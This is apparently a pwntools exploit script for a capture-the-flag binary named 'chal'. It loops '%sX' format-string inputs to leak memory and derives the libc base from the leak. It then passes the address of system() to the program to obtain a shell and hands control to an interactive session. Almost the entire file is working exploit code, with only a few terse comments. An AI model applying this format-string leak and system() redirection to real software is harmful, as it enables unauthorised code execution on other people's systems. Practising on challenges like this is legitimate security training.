#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./chal')
context.terminal = ['tmux', 'splitw', '-hp', '70']

libc = elf.libc

def start():
    if args.GDB:
        return gdb.debug('./chal', gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process( './chal')
r = start()
#========= exploit here ===================


##
#specifiers = [
#    "d", "i", "u", "o", "x", "X", "c", "s", "%", 
#    "ld", "li", "lu", "lo", "lx", "lX", 
#    "zd", "zi", "zu", "zo", "zx", "zX", 
#    "jd", "ji", "ju", "jo", "jx", "jX", 
#    "td", "ti", "tu", "to", "tx", "tX"
#]
#0x7fffffffc918 - 0x7fffffffbf30
for i in range(0xe90+7+8):
    formatted_specifier = f"%sX"
    r.sendline(b"1")
    log.info(f"try # {hex(i)}")
    r.sendline(formatted_specifier.encode("ascii"))
    r.recvuntil(b"Here: ")
    leak = r.recvuntil(b"1.").split(b"1.")[0]
    log.info(leak)


r.sendline(b"1")
log.info(f"leaking")
r.sendline(formatted_specifier.encode("ascii"))
r.recvuntil(b"XXXXXXXXX\x0e")
leak = u64(r.recvline().strip().split(b"X1.")[0][-6:].ljust(8,b"\x00"))

#leak = u64(r.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
log.info(f"leak = {hex(leak)}")
libc.address = leak - 0x5840
log.info(f"libc = {hex(libc.address)}")
#0x7f2be6adfda5 - 0x7f2be6800000 =  0x2dfda5
log.info(f"system = {hex(libc.sym.system)}")
#win
sleep(1)
r.sendlineafter(b'call', b'2')
log.info("Enter system address to get a shell")
sleep(1)

r.sendline(hex(libc.sym.system))


#========= interactive ====================
r.interactive()

